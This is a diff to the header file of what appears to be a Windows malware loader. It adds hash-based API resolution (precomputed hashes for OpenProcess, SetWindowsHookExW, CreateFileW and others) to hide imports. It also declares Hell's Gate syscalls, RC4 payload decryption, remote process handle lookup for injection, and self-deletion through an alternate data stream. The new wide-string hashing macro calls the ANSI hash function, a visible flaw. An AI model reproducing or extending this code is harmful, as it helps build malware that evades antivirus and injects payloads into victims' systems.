@@ -2,12 +2,14 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "HellsGate.h"
+#include "Typedef.h"
 
 // Initial seed used for hashing
 #define INITIAL_SEED	0x7
 
 // Real time hashing function
-#define RTIME_HASH(API) HashStringRotr32((LPCSTR) API)
+#define RTIME_HASHA(API) HashStringRotr32A((LPCSTR) API)
+#define RTIME_HASHW(API) HashStringRotr32A((LPCSTR) API)
 
 // New alternate datastream name
 #define NEW_STREAM L":DummyStream"
@@ -582,7 +584,7 @@ typedef struct _FILE_RENAME_INFORMATION
 /*--------------------------------------------------------------------
   FUNCTIONS
 --------------------------------------------------------------------*/
-UINT32 HashStringRotr32(LPCSTR String);
+UINT32 HashStringRotr32A(LPCSTR String);
 SIZE_T StringLengthA(LPCSTR String);
 UINT32 HashStringRotr32Sub(UINT32 Value, UINT Count);
 PTEB RtlGetThreadEnvironmentBlock();
@@ -598,6 +600,7 @@ WCHAR ToLowerCharW(IN WCHAR character);
 SIZE_T StringLengthW(IN LPCWSTR String);
 INT StringCompareA(IN LPCSTR String1, IN LPCSTR String2);
 BOOL IsStringEqual(IN LPCWSTR Str1, IN LPCWSTR Str2);
+UINT32 HashStringRotr32W(LPCWSTR String);
 
 // Defined in Injection.c
 BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);
@@ -630,8 +633,42 @@ typedef NTSTATUS(NTAPI* fnSystemFunction032) (
 BOOL Rc4DecryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
 
 // Defined and used by ApiHashing.cx
-FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
-
 #define CONTAINING_RECORD(address, type, field) ((type *)( (char *)(address) - (ULONG_PTR)(&((type *)0)->field) ))
 
+#define GetTickCount64HashValue					0xB26FB445
+#define OpenProcessHashValue					0x77CE8553
+#define CallNextHookExHashValue					0x5C51FD6F
+#define SetWindowsHookExWHashValue				0xA99AF232
+#define GetMessageWHashValue					0x61060461
+#define DefWindowProcWHashValue					0x22E85CBA
+#define UnhookWindowsHookExHashValue			0x5BE1CA0B
+#define GetModuleFileNameWHashValue				0xB4FFB003
+#define CreateFileWHashValue					0x94E432A9
+#define SetFileInformationByHandleHashValue     0xEBF511FC
+#define USER32DLLHashValue						0x5644677D
+#define KERNEL32DLLHashValue					0x954ADD0F
+
+typedef struct _API_HASHING {
+
+	fnGetTickCount64                pGetTickCount64;
+	fnOpenProcess                   pOpenProcess;
+	fnCallNextHookEx                pCallNextHookEx;
+	fnSetWindowsHookExW             pSetWindowsHookExW;
+	fnGetMessageW                   pGetMessageW;
+	fnDefWindowProcW                pDefWindowProcW;
+	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
+	fnGetModuleFileNameW            pGetModuleFileNameW;
+	fnCreateFileW                   pCreateFileW;
+	fnSetFileInformationByHandle    pSetFileInformationByHandle;
+
+}API_HASHING, * PAPI_HASHING;
+
+extern API_HASHING g_Api;
+
+FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
+FARPROC GetProcAddressByHashValue(IN HMODULE hModule, IN DWORD dwApiNameHashValue);
+
 HMODULE GetModuleHandleReplacement(IN LPCWSTR szModuleName);
+HMODULE GetModuleHandleByHashValue(IN DWORD dwModuleNameHashValue);
+
+BOOL InitializeWinApis();
